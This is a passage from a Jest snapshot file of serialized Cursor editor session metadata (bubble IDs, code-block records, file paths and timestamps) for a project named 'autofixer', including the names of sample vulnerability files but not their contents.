d9617-7446-4df5-8ff7-d6a22f6b598c","type":2,"serverBubbleId":"ad8c63f8-81ef-4b8f-a4c6-8a1353a450eb"},{"bubbleId":"71cfc086-7801-47e9-b7f9-d41eeec99e7c","type":2},{"bubbleId":"02cffbaf-93cb-47bb-96f3-8a1372a9b5de","type":1},{"bubbleId":"028cac40-7b1c-457d-bbf1-a80e23dd2cbb","type":2,"serverBubbleId":"1e41e05e-f14e-4536-8ba9-48022fe92901"},{"bubbleId":"7930de2a-bb46-4f9a-b882-c37ead417da3","type":2},{"bubbleId":"8f86860c-90b5-445f-a3b5-fe6193e2099f","type":2},{"bubbleId":"4d6ca93d-5387-4144-8e97-3f23fbd9b518","type":2,"serverBubbleId":"757c54f6-e68f-4cf9-b29a-867d8fb6326d"},{"bubbleId":"c3437e32-65de-4fad-96a0-b7a2e8633fa3","type":2},{"bubbleId":"819eb0b8-9859-42ba-a4bc-b1653d036a2b","type":2,"serverBubbleId":"4f4fd937-2edb-41e1-abb2-1de9e442de7b"},{"bubbleId":"bf4d1d0e-485e-47c4-ad13-e0c4d1151108","type":2},{"bubbleId":"5f9b9b76-61f5-4ee3-92a2-ff67d159211f","type":1},{"bubbleId":"44b7fc77-0875-4e3d-a9cc-f1312a4fc238","type":2,"serverBubbleId":"ac988c87-68a7-458a-9e3c-96a84e949a5f"},{"bubbleId":"a81b23f3-34eb-47ff-b05e-040610657612","type":2},{"bubbleId":"957b2072-9ec0-4d49-8317-b616b2cdf54e","type":2},{"bubbleId":"7eec589b-e0ae-4ee2-9eec-aeebf9e0bb08","type":2,"serverBubbleId":"b8ad3074-9a09-4327-b203-73716834c1e6"},{"bubbleId":"10a80a33-144c-40f5-919e-cd462aa26c2f","type":2}],"conversationMap":{},"status":"completed","context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"ideEditorsState":true,"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"notepads":[]},"gitGraphFileSuggestions":[],"generatingBubbleIds":[],"isReadingLongFile":false,"codeBlockData":{"file:///Users/jonathanafek/src/autofixer/sample_vulnerable.sql":{"39cbec64-aa7f-44fc-8416-e5a808e9c261":{"_v":3,"bubbleId":"d421068d-b5b6-4f79-a576-ce584a2a2511","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_vulnerable.sql","external":"file:///Users/jonathanafek/src/autofixer/sample_vulnerable.sql","path":"/Users/jonathanafek/src/autofixer/sample_vulnerable.sql","scheme":"file"},"codeblockId":"39cbec64-aa7f-44fc-8416-e5a808e9c261","status":"accepted","languageId":"sql","codeBlockDisplayPreference":"collapsed","createdAt":1761756569048,"diffId":"dd978643-b076-4fbc-85d0-7d5b2c5675c4","lastDiffId":"056422ad-f450-42b7-8381-e2d2695aa43b","lastAppliedAt":1761756576684}},"file:///Users/jonathanafek/src/autofixer/sample_java_sqli.java":{"6fb23eac-cf57-47bc-8ca4-a3fbbc6e6321":{"_v":3,"bubbleId":"37b27e17-68e4-48ef-864b-422559538c33","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_java_sqli.java","external":"file:///Users/jonathanafek/src/autofixer/sample_java_sqli.java","path":"/Users/jonathanafek/src/autofixer/sample_java_sqli.java","scheme":"file"},"codeblockId":"6fb23eac-cf57-47bc-8ca4-a3fbbc6e6321","status":"accepted","languageId":"java","codeBlockDisplayPreference":"collapsed","createdAt":1761756576998,"diffId":"d3dd156b-35b6-4dd4-b036-2321e3474ff1","lastDiffId":"97ba1ef0-3991-4cbe-9221-81a881f7586d","lastAppliedAt":1761756582348}},"file:///Users/jonathanafek/src/autofixer/sample_python_sqli.py":{"d0445829-ca93-4bf6-bca6-594dd5712ff0":{"_v":3,"bubbleId":"d668df1f-e868-4528-ac19-0aaa09f4252c","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_python_sqli.py","external":"file:///Users/jonathanafek/src/autofixer/sample_python_sqli.py","path":"/Users/jonathanafek/src/autofixer/sample_python_sqli.py","scheme":"file"},"codeblockId":"d0445829-ca93-4bf6-bca6-594dd5712ff0","status":"accepted","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1761756631073,"diffId":"6aac3d31-2cdb-49c3-b953-98bf14d84335","lastDiffId":"40c76a10-9a56-46f9-8c31-2eaecc72ef92","lastAppliedAt":1761756636061}},"file:///Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js":{"45e641dc-f91c-469c-89e6-154af6011ab3":{"_v":3,"bubbleId":"424b33b2-a7b5-4ba5-8989-4db4eb8aebf5","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js","external":"file:///Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js","path":"/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js","scheme":"file"},"codeblockId":"45e641dc-f91c-469c-89e6-154af6011ab3","status":"accepted","languageId":"javascript","codeBlockDisplayPreference":"collapsed","createdAt":1761756636239,"diffId":"9eddbfb6-15a9-4580-95b8-dcdd6c521735","lastDiffId":"bcc210ad-ef15-43e1-b289-45cc06e933ab","lastAppliedAt":1761756646251}},"file:///Users/jonathanafek/src/autofixer/sample_insecure_random.py":{"c6c3e654-7499-4155-9f51-d2a4d17fd8c2":{"_v":3,"bubbleId":"3674dbb4-9c1c-4254-92a7-7e6588b5a738","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_insecure_random.py","external":"file:///Users/jonathanafek/src/autofixer/sample_insecure_random.py","path":"/Users/jonathanafek/src/autofixer/sample_insecure_random.py","scheme":"file"},"codeblockId":"c6c3e654-7499-4155-9f51-d2a4d17fd8c2","status":"accepted","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1761756664605,"diffId":"4b5bb572-c51c-4e63-ad0d-02b67edfcd0a","lastDiffId":"2f3ec1af-4be4-4858-8787-1c094277d15d","lastAppliedAt":1761756672991}},"file:///Users/jonathanafek/src/autofixer/sample_path_traversal.go":{"8120d729-7749-4efc-b4cd-0accead84c50":{"_v":3,"bubbleId":"5396746f-2ba0-4fe4-91a4-456b134359df","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_path_traversal.go","external":"file:///Users/jonathanafek/src/autofixer/sample_path_traversal.go","path":"/Users/jonathanafek/src/autofixer/sample_path_traversal.go","scheme":"file"},"codeblockId":"8120d729-7749-4efc-b4cd-0accead84c50","status":"accepted","languageId":"go","codeBlockDisplayPreference":"collapsed","createdAt":1761756673285,"diffId":"f7689852-e156-472a-ab57-3ec8b86a056f","lastDiffId":"b361db51-c220-4dfb-b73c-a74d8190eeb1","lastAppliedAt":1761756686721}},"file:///Users/jonathanafek/src/autofixer/sample_command_injection.sh":{"6cd0e1c3-634e-4012-b517-0e5f343e7719":{"_v":3,"bubbleId":"eff6d6dc-32d7-44df-924b-dbbd75ded762","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_command_injection.sh","external":"file:///Users/jonathanafek/src/autofixer/sample_command_injection.sh","path":"/Users/jonathanafek/src/autofixer/sample_command_injection.sh","scheme":"file"},"codeblockId":"6cd0e1c3-634e-4012-b517-0e5f343e7719","status":"accepted","languageId":"shellscript","codeBlockDisplayPreference":"collapsed","createdAt":1761758363607,"diffId":"6f294c91-e40e-42eb-94fe-ac6e8cf83d96","lastDiffId":"896acf13-b167-4aa4-8fee-44d3d762ef54","lastAppliedAt":1761758375904,"partialInlineDiffFatesId":"2dc8d401-a6ee-4426-ad26-0bfe848da7bd"}},"file:///Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java":{"993b9148-dbdc-4b35-b1d1-7d80ec0455db":{"_v":3,"bubbleId":"5c6cc316-ae9f-4000-b36c-ba99def572e5","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java","external":"file:///Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java","path":"/Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java","scheme":"file"},"codeblockId":"993b9148-dbdc-4b35-b1d1-7d80ec0455db","status":"accepted","languageId":"java","codeBlockDisplayPreference":"collapsed","createdAt":1761758376060,"diffId":"7ba9ee40-ff3d-4ded-aeaa-a2600146eaab","lastDiffId":"6dc7776a-3eed-4ce8-92a3-9ca31cba9382","lastAppliedAt":1761758387200,"partialInlineDiffFatesId":"b4a7371b-7b28-4161-9efb-304815d5ed90"}},"file:///Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml":{"7c8d9e36-189c-4e73-bd67-8b0e44b73622":{"_v":3,"bubbleId":"26c4e848-8ac3-47e0-8f38-a400d774949b","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml","external":"file:///Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml","path":"/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml","scheme":"file"},"codeblockId":"7c8d9e36-189c-4e73-bd67-8b0e44b73622","status":"accepted","languageId":"xml","codeBlockDisplayPreference":"collapsed","createdAt":1761758615899,"diffId":"33cb46a5-caa2-4b84-a3de-ca75d138a23c","lastDiffId":"d831186a-fdb5-4415-a373-0a5997b0b123","lastAppliedAt":1761758622161,"partialInlineDiffFatesId":"20e6268c-7aa6-46f1-a249-4a3b427ee69e"}},"file:///Users/jonathanafek/src/autofixer/sample_weak_crypto.py":{"2c44b274-e4cb-4633-8739-e4ef55cf6304":{"_v":3,"bubbleId":"0cdade13-5177-4c56-802f-43ac65b91cae","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_weak_crypto.py","external":"file:///Users/jonathanafek/src/autofixer/sample_weak_crypto.py","path":"/Users/jonathanafek/src/autofixer/sample_weak_crypto.py","scheme":"file"},"codeblockId":"2c44b274-e4cb-4633-8739-e4ef55cf6304","status":"accepted","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1761758622340,"diffId":"2c79c610-9731-4688-9ca5-9e7d1fed28e4","lastDiffId":"ea318034-44a2-4b40-a1c1-df60cb2269a9","lastAppliedAt":1761758634059,"partialInlineDiffFatesId":"5a997c5d-339a-48c4-94f0-7683971be207"}},"file:///Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py":{"33be2f1b-2559-486a-a781-ea3ae8bfcbfb":{"_v":3,"bubbleId":"e51be9b8-1432-4782-9e34-e0f7b4fd60c0","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py","external":"file:///Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py","path":"/Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py","scheme":"file"},"codeblockId":"33be2f1b-2559-486a-a781-ea3ae8bfcbfb","status":"accepted","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1761758788493,"diffId":"6ff886b2-8e12-4b87-8885-26465d43443b","lastDiffId":"385ed3b4-f5f5-4aeb-becf-50651d1178ea","lastAppliedAt":1761758809970,"partialInlineDiffFatesId":"9131696e-ecbc-486a-8cba-b5204fc1de0a"}},"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go":{"05f86090-cd1d-4151-81f1-fd6653b5efd7":{"_v":3,"bubbleId":"901a83b8-cad1-456d-a0ee-5044cf6c8aaa","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","external":"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go","path":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","scheme":"file"},"codeblockId":"05f86090-cd1d-4151-81f1-fd6653b5efd7","status":"accepted","languageId":"go","codeBlockDisplayPreference":"collapsed","createdAt":1761758810161,"diffId":"f286257d-5e12-4007-a3fe-51f159251da6","lastDiffId":"c909805a-ee67-4014-805c-bf1155d1152a","lastAppliedAt":1761758828315},"913e8eaa-eae6-44fb-ad79-92f6e8b28c55":{"_v":3,"bubbleId":"246c1ae1-899f-41c1-b8d8-62839f3147ba","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","external":"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go","path":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","scheme":"file"},"codeblockId":"913e8eaa-eae6-44fb-ad79-92f6e8b28c55","status":"accepted","languageId":"go","chainedInfo":{"chainedFromCodeblockId":"05f86090-cd1d-4151-81f1-fd6653b5efd7","composerId":"b777ffa2-b1cc-4064-a0a1-6bb58e24ad53"},"codeBlockDisplayPreference":"collapsed","createdAt":1761758847110,"diffId":"ae756fb5-0b6d-45a0-a643-25db3b984ac1","lastDiffId":"fce83bde-db1a-4bcd-b81f-e5d9c253d28c","lastAppliedAt":1761758848410},"3f118780-8563-4d2f-9f36-e8d7ea7cc6b3":{"_v":3,"bubbleId":"bd8fa862-6a62-4056-b5be-18cca5685504","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","external":"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go","path":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","scheme":"file"},"codeblockId":"3f118780-8563-4d2f-9f36-e8d7ea7cc6b3","status":"accepted","languageId":"go","chainedInfo":{"chainedFromCodeblockId":"913e8eaa-eae6-44fb-ad79-92f6e8b28c55","composerId":"b777ffa2-b1cc-4064-a0a1-6bb58e24ad53"},"codeBlockDisplayPreference":"collapsed","createdAt":1761758848618,"diffId":"0b688e48-e3e5-4411-a544-c62cdadb8cd6","lastDiffId":"b96e1c8d-d803-41cd-8dd0-4c5546d1b92e","lastAppliedAt":1761758850046},"3223d1c7-0922-44ed-af85-888b834427cc":{"_v":3,"bubbleId":"48687ba0-76e4-4a3c-96d1-b997e8fbf745","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","external":"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go","path":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","scheme":"file"},"codeblockId":"3223d1c7-0922-44ed-af85-888b834427cc","status":"accepted","languageId":"go","chainedInfo":{"chainedFromCodeblockId":"3f118780-8563-4d2f-9f36-e8d7ea7cc6b3","composerId":"b777ffa2-b1cc-4064-a0a1-6bb58e24ad53"},"codeBlockDisplayPreference":"collapsed","createdAt":1761758850282,"diffId":"555f0e9e-44cc-4c29-88c1-3d3eeceed0ac","lastDiffId":"2757dee1-9af5-41d5-8544-f5f687817316","lastAppliedAt":1761758853847,"partialInlineDiffFatesId":"a1e4e04c-44ed-4e7c-b2c1-554970d321df"}},"file:///Users/jonathanafek/src/autofixer/random_file.txt":{"0b63dcfb-e2fb-4cb3-b031-4076b05b3d09":{"_v":3,"bubbleId":"8f13703a-2404-489f-ad27-c9905b3302f3","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/random_file.txt","external":"file:///Users/jonathanafek/src/autofixer/random_file.txt","path":"/Users/jonathanafek/src/autofixer/random_file.txt","scheme":"file"},"codeblockId":"0b63dcfb-e2fb-4cb3-b031-4076b05b3d09","status":"accepted","languageId":"plaintext","codeBlockDisplayPreference":"collapsed","createdAt":1762189996154,"diffId":"b796096e-eab8-49dc-8dd7-662b682675b5","lastDiffId":"9343cb90-3579-4339-aab7-dcb6b05b82a6","lastAppliedAt":1762189999792,"partialInlineDiffFatesId":"03ca17bd-1f2a-42ea-bf15-43195b782b74"}},"file:///Users/jonathanafek/src/autofixer/another_random_file.md":{"ce8b44ca-cc05-466a-b9fa-cefb828771ff":{"_v":3,"bubbleId":"b85ce68a-237e-4950-96ae-a9afd2a8a1ec","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/another_random_file.md","external":"file:///Users/jonathanafek/src/autofixer/another_random_file.md","path":"/Users/jonathanafek/src/autofixer/another_random_file.md","scheme":"file"},"codeblockId":"ce8b44ca-cc05-466a-b9fa-cefb828771ff","status":"accepted","languageId":"markdown","codeBlockDisplayPreference":"collapsed","createdAt":1762206189225,"diffId":"3dd0a8e1-7811-46ae-987e-3a2c397dd430","lastDiffId":"f6edb47a-a524-4f1e-a53a-3730a5de7727","lastAppliedAt":1762206193386,"partialInlineDiffFatesId":"f7f3b67b-9510-4e42-874d-2b613d44c145"}},"file:///Users/jonathanafek/src/autofixer/yet_another_random.json":{"1dbad049-38bb-4703-adc5-4725bd837d07":{"_v":3,"bubbleId":"51d7caf4-0b94-4b5c-8750-1d09a9ca88ec","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/yet_another_random.json","external":"file:///Users/jonathanafek/src/autofixer/yet_another_random.json","path":"/Users/jonathanafek/src/autofixer/yet_another_random.json","scheme":"file"},"codeblockId":"1dbad049-38bb-4703-adc5-4725bd837d07","status":"accepted","languageId":"json","codeBlockDisplayPreference":"collapsed","createdAt":1762206244251,"diffId":"4b78ba85-50d3-483b-b6f6-38886195b223","lastDiffId":"4bd1f454-40f4-45be-84c0-a1f9c64714f3","lastAppliedAt":1762206249147,"partialInlineDiffFatesId":"33ca4c59-7e58-4d10-ba84-a4b84048faf4"}},"file:///Users/jonathanafek/src/autofixer/final_random_file.py":{"d90b6334-7162-4883-b2ff-a31da2d5802d":{"_v":3,"bubbleId":"058513f2-aba7-449f-8e3b-7bba6cbceecc","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/final_random_file.py","external":"file:///Users/jonathanafek/src/autofixer/final_random_file.py","path":"/Users/jonathanafek/src/autofixer/final_random_file.py","scheme":"file"},"codeblockId":"d90b6334-7162-4883-b2ff-a31da2d5802d","status":"accepted","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1762208083425,"diffId":"eb2cfb68-7a0e-45e1-bebe-cbdfd4deee6f","lastDiffId":"0690f752-329e-46e8-be70-bd23175dd3d3","lastAppliedAt":1762208087625,"partialInlineDiffFatesId":"f88a6ef8-ceef-4465-b785-bb4d631fc0e8"}},"file:///Users/jonathanafek/src/autofixer/more_random_content.yaml":{"e1e25309-9273-4056-86cb-a1792b34fb87":{"_v":3,"bubbleId":"f80299f1-a1a5-46c7-8b4c-dc50bfc68027","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/more_random_content.yaml","external":"file:///Users/jonathanafek/src/autofixer/more_random_content.yaml","path":"/Users/jonathanafek/src/autofixer/more_random_content.yaml","scheme":"file"},"codeblockId":"e1e25309-9273-4056-86cb-a1792b34fb87","status":"accepted","languageId":"yaml","codeBlockDisplayPreference":"collapsed","createdAt":1762209881215,"diffId":"e567d9dc-0547-4b23-98d4-008e8da62564","lastDiffId":"06024ba1-665d-4914-a4ae-c9cff11cb1db","lastAppliedAt":1762209885113,"partialInlineDiffFatesId":"b21a169f-d9e9-4c13-954e-300b0334ce17"}},"file:///Users/jonathanafek/src/autofixer/new_file.ts":{"36c3ac45-0e2d-4cc4-9e7a-2508c9a0e98e":{"_v":3,"bubbleId":"8f86860c-90b5-445f-a3b5-fe6193e2099f","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/new_file.ts","external":"file:///Users/jonathanafek/src/autofixer/new_file.ts","path":"/Users/jonathanafek/src/autofixer/new_file.ts","scheme":"file"},"codeblockId":"36c3ac45-0e2d-4cc4-9e7a-2508c9a0e98e","status":"accepted","languageId":"typescript","codeBlockDisplayPreference":"collapsed","createdAt":1762278671653,"diffId":"e20fdca8-5099-4f08-882e-bb501c5a47a3","lastDiffId":"60ac4a48-a6df-4929-938f-c1543974d652","lastAppliedAt":1762278678480,"partialInlineDiffFatesId":"fe035db5-4e32-4e56-8525-ecd62ae19070"}},"file:///Users/jonathanafek/src/autofixer/another_new_file.sh":{"93ad14f6-887c-4b83-a2d3-37c80cccbf15":{"_v":3,"bubbleId":"957b2072-9ec0-4d49-8317-b616b2cdf54e","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/another_new_file.sh","external":"file:///Users/jonathanafek/src/autofixer/another_new_file.sh","path":"/Users/jonathanafek/src/autofixer/another_new_file.sh","scheme":"file"},"codeblockId":"93ad14f6-887c-4b83-a2d3-37c80cccbf15","status":"accepted","languageId":"shellscript","codeBlockDisplayPreference":"collapsed","createdAt":1762279205285,"diffId":"34f612bf-8a08-4fe5-b3d4-9becec6533b0","lastDiffId":"7f5d15f9-9829-491b-b13b-d143718ad3fc","lastAppliedAt":1762279211325,"partialInlineDiffFatesId":"d80eb442-02fe-4cd9-9338-b0d6aee07fbd"}}},"originalFileStates":{"file:///Users/jonathanafek/src/autofixer/sample_vulnerable.sql":{"content":"","firstEditBubbleId":"d421068d-b5b6-4f79-a576-ce584a2a2511","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_java_sqli.java":{"content":"","firstEditBubbleId":"37b27e17-68e4-48ef-864b-422559538c33","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_python_sqli.py":{"content":"","firstEditBubbleId":"d668df1f-e868-4528-ac19-0aaa09f4252c","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js":{"content":"","firstEditBubbleId":"424b33b2-a7b5-4ba5-8989-4db4eb8aebf5","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_insecure_random.py":{"content":"","firstEditBubbleId":"3674dbb4-9c1c-4254-92a7-7e6588b5a738","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_path_traversal.go":{"content":"","firstEditBubbleId":"5396746f-2ba0-4fe4-91a4-456b134359df","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_command_injection.sh":{"content":"","firstEditBubbleId":"eff6d6dc-32d7-44df-924b-dbbd75ded762","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java":{"content":"","firstEditBubbleId":"5c6cc316-ae9f-4000-b36c-ba99def572e5","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml":{"content":"","firstEditBubbleId":"26c4e848-8ac3-47e0-8f38-a400d774949b","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_weak_crypto.py":{"content":"","firstEditBubbleId":"0cdade13-5177-4c56-802f-43ac65b91cae","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py":{"content":"","firstEditBubbleId":"e51be9b8-1432-4782-9e34-e0f7b4fd60c0","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go":{"content":"","firstEditBubbleId":"901a83b8-cad1-456d-a0ee-5044cf6c8aaa","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/random_file.txt":{"content":"","firstEditBubbleId":"8f13703a-2404-489f-ad27-c9905b3302f3","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/another_random_file.md":{"content":"","firstEditBubbleId":"b85ce68a-237e-4950-96ae-a9afd2a8a1ec","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/yet_another_random.json":{"content":"","firstEditBubbleId":"51d7caf4-0b94-4b5c-8750-1d09a9ca88ec","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/final_random_file.py":{"content":"","firstEditBubbleId":"058513f2-aba7-449f-8e3b-7bba6cbceecc","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/more_random_content.yaml":{"content":"","firstEditBubbleId":"f80299f1-a1a5-46c7-8b4c-dc50bfc68027","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/new_file.ts":{"content":"","firstEditBubbleId":"8f86860c-90b5-445f-a3b5-fe6193e2099f","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/another_new_file.sh":{"content":"","firstEditBubbleId":"957b2072-9ec0-4d49-8317-b616b2cdf54e","isNewlyCreated":true,"newlyCreatedFolders":[]}},"newlyCreatedFiles":[],"newlyCreatedFolders":[],"lastUpdatedAt":1762279213426,"createdAt":1761756449546,"hasChangedContext":true,"activeTabsShouldBeReactive":true,"capabilities":[{"type":30,"data":{}},{"type":34,"data":{}},{"type":15,"data":{"bubbleDataMap":"{}"}},{"type":22,"data":{}},{"type":18,"data":{}},{"type":19,"data":{}},{"type":33,"data":{}},{"type":32,"data":{}},{"type":23,"data":{}},{"type":6,"data":{}},{"type":16,"data":{}},{"type":24,"data":{}},{"type":25,"data":{}},{"type":21,"data":{}},{"type":31,"data":{}},{"type":29,"data":{}}],"name":"Put sample files in repo root","isFileListExpanded":false,"browserChipManuallyDisabled":false,"browserChipManuallyEnabled":false,"unifiedMode":"agent","forceMode":"edit","usageData":{},"contextUsagePercent":30.375503540039062,"allAttachedFileCodeChunksUris":["file:///Users/jonathanafek/src/autofixer/sample_vulnerable.sql","file:///Users/jonathanafek/src/autofixer/sample_java_sqli.java","file:///Users/jonathanafek/src/autofixer/sample_python_sqli.py","file:///Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js","file:///Users/jonathanafek/src/autofixer/sample_command_injection.sh","file:///Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java","file:///Users/jonathanafek/src/autofixer/random_file.txt","file:///Users/jonathanafek/src/autofixer/another_random_file.md","file:///Users/jonathanafek/src/autofixer/yet_another_random.json","file:///Users/jonathanafek/src/autofixer/final_random_file.py"],"modelConfig":{"modelName":"default","maxMode":false},"subComposerIds":[],"capabilityContexts":[],"todos":[],"isTodoListExpanded":false,"isQueueExpanded":true,"hasUnreadMessages":false,"gitHubPromptDismissed":false,"totalLinesAdded":1225,"totalLinesRemoved":19,"addedFiles":0,"removedFiles":0,"isArchived":false,"isDraft":false,"isCreatingWorktree":false,"isApplyingWorktree":false,"isUndoingWorktree":false,"pendingCreateWorktree":false,"isBestOfNSubcomposer":false,"isBestOfNParent":false,"isSpec":false,"isSpecSubagentDone":false,"stopHookLoopCount":0,"speculativeSummarizationEncryptionKey":"YMgVQOI7/lJxlOWAyG2ZWL3WnfrZ5tHJGg34eSYkDgI=","isNAL":false,"planModeSuggestionUsed":false,"latestChatGenerationUUID":"cb6627e8-ac3d-4c3a-b630-f91278ce4f2a","isAgentic":true,"subtitle":"another_new_file.sh, new_file.ts","filesChangedCount":19}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-29 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a8671dbe-8f02-428a-944f-35d85ea032f1",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"a8671dbe-8f02-428a-944f-35d85ea032f1","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"ee048cd7-6c01-42f5-9764-7b080f01b623","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,3,41,5,6,7,38,8,9,11,12,15,16,18,19,23,24,25,27,28,43,29,30,31,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentati